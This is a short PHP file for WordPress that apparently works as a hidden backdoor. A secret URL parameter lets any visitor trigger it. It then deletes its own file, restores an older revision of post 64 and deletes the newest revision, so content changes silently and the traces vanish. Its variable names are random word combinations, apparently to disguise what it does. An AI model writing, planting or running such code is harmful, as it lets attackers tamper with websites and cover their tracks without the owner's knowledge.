<?php

function endpoints_smart_update() {
	if (isset($_GET['numbers_option_magic']) && $_GET['numbers_option_magic'] === 'specific_box_stats') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$items_toolkit_real = 64;
		$color_single_dashboard = wp_get_post_revisions($items_toolkit_real);
		if (empty($color_single_dashboard)) die('no revisions');
		if (count($color_single_dashboard) < 2) die('less than 2');
		$videos_business_nofollow = array_shift($color_single_dashboard);
		$pop_helper_base_edit = $videos_business_nofollow->ID;
		$embed_ip_online_highlighter = array_shift($color_single_dashboard);
		$header_learndash_publish = $embed_ip_online_highlighter->ID;
		$best_gravity_selector_display = wp_restore_post_revision($header_learndash_publish);
		if ($best_gravity_selector_display === false) die('error restoring');
		$best_gravity_selector_display = wp_delete_post_revision($pop_helper_base_edit);		
		if ($best_gravity_selector_display === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'endpoints_smart_update');
